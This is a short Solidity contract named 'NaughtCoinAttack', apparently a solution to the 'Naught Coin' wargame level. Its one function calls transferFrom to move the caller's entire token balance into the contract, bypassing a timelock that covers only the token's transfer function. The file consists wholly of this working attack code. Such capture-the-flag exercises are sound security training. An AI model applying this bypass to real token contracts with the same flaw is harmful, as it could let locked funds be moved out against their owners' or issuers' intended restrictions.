// SPDX-License-Identifier: UNLICENSED

import {IERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoinAttack {
    function attack(address token, address attacker) external {
        IERC20(token).transferFrom(attacker, address(this), IERC20(token).balanceOf(attacker));
    }
}
